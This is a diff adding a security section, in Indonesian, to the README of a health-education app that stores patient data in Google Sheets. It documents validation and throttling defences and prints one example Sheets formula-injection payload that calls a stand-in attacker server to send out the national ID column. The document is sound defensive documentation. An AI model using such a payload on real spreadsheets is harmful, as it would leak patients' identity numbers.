@@ -275,6 +275,69 @@ Yang wajib dilakukan:
   tampilan. Ini bisa dikerjakan, tapi mengubah kolom `NIK` jadi tidak lagi
   bisa dibaca manusia
 
+### Keamanan endpoint
+
+URL Web App di-deploy dengan *Who has access: Anyone*, jadi **siapa pun yang
+punya URL itu bisa menulis ke sheet**. Ini bukan pilihan: aplikasinya statis
+(GitHub Pages), tidak ada server tempat menyimpan rahasia, dan URL-nya selalu
+terlihat di DevTools. Karena repo aplikasinya publik, URL itu juga bisa
+ditemukan pemindai otomatis GitHub.
+
+Selama masa uji risiko ini diterima. **Sebelum dipakai pasien nyata**, lakukan
+salah satu:
+
+- Apps Script → *Deploy → Manage deployments → Edit → New version*. URL berubah,
+  yang lama mati. Perbarui `SHEETS_ENDPOINT` di `config.js`
+- atau jadikan repo GitHub private
+
+Yang sudah dipasang di `gas/Code.gs` sebagai peredam:
+
+| Peredam | Fungsi | Yang dicegah |
+|---|---|---|
+| Validasi per field | `validasiSimpan()` | Data ngawur masuk sheet dan mengotori rekap bidan |
+| Daftar tertutup | `KELURAHAN_SAH`, `PUSKESMAS_SAH` | Kelurahan/puskesmas karangan — request dari luar aplikasi langsung tertolak |
+| Clamp nilai | `dalamRentang()` | Klien mengirim `kkm=0` supaya semua orang jadi `LULUS` |
+| Pembatas laju | `lolosThrottle()` | Sheet dibanjiri ribuan baris; batas 40 penyimpanan / 10 menit |
+| Penetral formula | `amanTeks()` | Injeksi formula Sheets (lihat di bawah) |
+| Validasi header | `bedaHeader()` | Data masuk ke kolom yang salah kalau susunan sheet bergeser |
+
+Aturan validasinya:
+
+| Field | Aturan |
+|---|---|
+| NIK | tepat 16 digit angka |
+| Nama | 3–80 karakter, tanpa `<` `>` dan tanpa URL |
+| No WA | `0` di depan, total 9–15 digit |
+| Alamat | 5–200 karakter, tanpa `<` `>` dan tanpa URL |
+| Kelurahan | harus salah satu dari 8 kelurahan resmi |
+| Puskesmas | harus salah satu dari 9 puskesmas/pustu resmi |
+| Kunjungan ke- | bilangan bulat 1–10 |
+| Pre-Test / Post-Test | bilangan bulat 0–100 **dan kelipatan 10** |
+
+Skor wajib kelipatan 10 karena setiap set berisi 10 soal Benar/Salah — nilai
+seperti 77 tidak mungkin datang dari aplikasi.
+
+**Injeksi formula Sheets.** Ini risiko yang nyata justru karena bidan membuka
+spreadsheet-nya. Sel yang isinya diawali `=` `+` `-` `@` akan dieksekusi Sheets
+sebagai formula saat file dibuka. Kalau seseorang mengisi kolom Nama dengan
+
+```
+=IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50);"//a")
+```
+
+maka begitu bidan membuka sheet, seluruh kolom NIK terkirim ke server luar —
+tanpa perlu menembus apa pun. `amanTeks()` menambahkan prefiks apostrof pada
+nilai semacam itu supaya Sheets memperlakukannya sebagai teks biasa. Apostrofnya
+dilepas kembali oleh `tanpaApostrof()` saat data dibaca ke aplikasi, jadi form
+tidak pernah menampilkan tanda itu.
+
+Untuk memastikan semuanya aktif, jalankan **`ujiValidasi()`** dari editor Apps
+Script. Fungsi ini tidak menulis apa pun ke sheet — hanya melempar 15 payload
+buruk ke validator dan melaporkan mana yang tertolak.
+
+> Setiap `gas/Code.gs` diubah, perubahan **belum berlaku** sampai
+> *Deploy → Manage deployments → Edit → New version* dijalankan.
+
 ---
 
 ## 8. Contoh isi
